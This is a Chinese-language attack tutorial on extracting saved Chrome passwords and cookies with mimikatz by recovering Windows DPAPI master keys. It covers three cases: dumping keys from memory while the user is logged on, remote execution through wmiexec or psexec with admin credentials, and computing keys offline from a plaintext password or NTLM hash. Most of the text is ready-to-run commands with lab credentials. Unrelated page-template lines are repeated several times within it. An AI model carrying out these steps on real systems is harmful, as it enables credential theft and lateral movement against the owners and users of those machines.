# 使用mimikatz导出chrome中的密码

场景说明

固定布局                                                          
工具条上设置固定宽高  
背景可以设置被包含  
可以完美对齐背景图和文字  
以及制作自己的模板

模拟场景：在获取某PC本地administrator的权限情况下，导出使用该PC机域普通账号的密码。  
真实场景：通过一些方法定位并控制了管理员的个人办公pc机，为了进一步获取核心系统的权限，可能需要从其chrome中导出各种密码。

  

受害机ip：192.168.3.4  
受害机账户：  

*   本地管理员：administrator/toor
    
*   域普通账户：beta\\fengjie/qqq123!@#
    

  

  
  

加密机制简介

  

  

chrome储存的明文密码时使用windows提供的DPAPI进行对称加密来保证安全性。加解密的密钥称为master key。master key被用户登录密码、SID和16字节随机数加密后保存在Master Key file（\`%APPDATA%\\Microsoft\\Protect\\%SID%\`）中。

**1.最简单的情况**

**A用户拖A自己的密码  
**

固定布局                                                          
工具条上设置固定宽高  
背景可以设置被包含  
可以完美对齐背景图和文字  
以及制作自己的模板

```
dpapi::chrome /in:'C:\\Users\\fengjie\\AppData\\Local\\Google\\Chrome\\User
Data\\Default\\Login Data' /unprotect
```

**2.在A用户登陆状态**

**B解密A的chrome密码**

固定布局                                                          
工具条上设置固定宽高  
背景可以设置被包含  
可以完美对齐背景图和文字  
以及制作自己的模板

在用户登陆状态下可以直接用procdump或者mimikatz直接从内存中获取master key。

```
privilege::debug
sekurlsa::dpapi

python wmiexec.py administrator:toor@192.168.3.4 'c:\\users\\public\\mimikatz.exe "privilege::debug" "sekurlsa::dpapi" exit'
```

![](../Images/15c5cd38fd8d2f7f6fbaeb563fb152e8.png)

获取到masterkey

```
0bf0be64d4dc768a543b3a12d7c5210d184c07a3861cad8f2bd8b7bbacc60fd0e06e955b6dad057d070d1ce3b2bb331fd8dbce6efad08808f1849e4f4ef26d80

1b81b1c9cb66a3f93b58f85948e8ce53779c6e5d
```

接下来用mimikatz一把梭就可以了  

```
python wmiexec.py administrator:toor@192.168.3.4 'cd c:\\users\\public && Minimimini64.exe "dpapi::chrome /in:\\"C:\\Users\\fengjie\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\\" /masterkey:1b81b1c9cb66a3f93b58f85948e8ce53779c6e5d" exit '
```

最开始用wmiexec并未解密成功  

![](../Images/5f684f4cd75ae128b2d4164a755e29e7.png)

后来发现是wmiexec的锅，换成psexec就好了*（***用smbexec也可以，怀疑是因为用wmiexec时令牌完整性受限的原因***）*  

![](../Images/9618aebcf2308b9d62b734bc44a87215.png)

**3.在A用户离线状态**

**B解密A的chrome密码**

固定布局                                                          
工具条上设置固定宽高  
背景可以设置被包含  
可以完美对齐背景图和文字  
以及制作自己的模板

现在用mimikatz重新抓已经抓不到fengjie的master key了  

![](../Images/39a3cf9305fa18c1b5430467fcf5229b.png)

一、用户密码已知

这种情况下有两种方法可以选择。

1.如果我们知道fengjie的明文密码，可以用runas降权(或者进行一些spwan的操作降权)，降权之后又回到了最简单的情况。（因为runas需要交互式shell，所以这种方法比较鸡肋）

```
runas /user:fengjie@beta.com "cmd.exe"

mimikatz dpapi::chrome /in:”%localappdata%\\Google\\Chrome\\User Data\\Default\\Cookies” /unprotect
```

2.在没有交互式的情况下可以直接用mimikatz直接算出master key。  

```
dpapi::masterkey /in:"c:\\Users\\fengjie\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2274946182-2013957047-1890316882-1632\\59a94dbc-6dbb-4d51-bec0-edebc6f2e9f8" /password:qqq123!@#
```

![](../Images/e9fcf6868320eec390c41751349081ee.png)

拿到master key后情况又相当于又转换回了用户在线的情景。

二、用户明文密码未知,知道NTLM hash  

```
dpapi::masterkey /in:"c:\\Users\\fengjie\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2274946182-2013957047-1890316882-1632\\59a94dbc-6dbb-4d51-bec0-edebc6f2e9f8" /hash:632f6adad4510099d676724bfb87c6ee
```

![](../Images/2e30a13b8405dd30b80077d97de2a972.png)  
  

** 总结   
**

  

简单的说就是三种情况  

  

*   A用户获取自己chrome密码不需要知道master key  
    
*   A获取B用户，如果B用户在线，那么可以直接从内存中抓取出B的maste key
    
*   A获取B用户，B不在线，就需要用b用户的明文密码或者NTLM hash计算出master key,在回到上面一步。
